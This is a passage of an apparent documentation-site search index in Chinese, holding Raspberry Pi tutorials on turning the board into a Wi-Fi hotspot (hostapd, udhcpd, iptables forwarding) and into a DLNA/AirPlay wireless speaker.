5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u8001\u5f902014 CSDN\u535a\u5ba2 \u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#6wifi_2014-csdn_wifi","text":"\u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#auto-wlan0","text":"#iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"auto wlan0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/","text":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1 \u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee \u51c6\u5907\u5de5\u4f5c \u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e \u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport \u5fc5\u8981\u73af\u5883 $ sudo apt-get install git DLNA \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md \u5b89\u88c5\u4f9d\u8d56 gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf \u5b89\u88c5 Gmrender 1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2 \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults AirPlay \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki \u5b89\u88c5\u4f9d\u8d56 $ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev \u5b89\u88c5 AirPlay 1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults \u6700\u7ec8\u6548\u679c \u66f4\u591a\u6559\u7a0b http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlnaairplay","text":"\u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_1","text":"\u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e \u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_2","text":"$ sudo apt-get install git","title":"\u5fc5\u8981\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlna","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md","title":"DLNA \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_3","text":"gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#gmrender","text":"1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2","title":"\u5b89\u88c5 Gmrender"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_4","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp 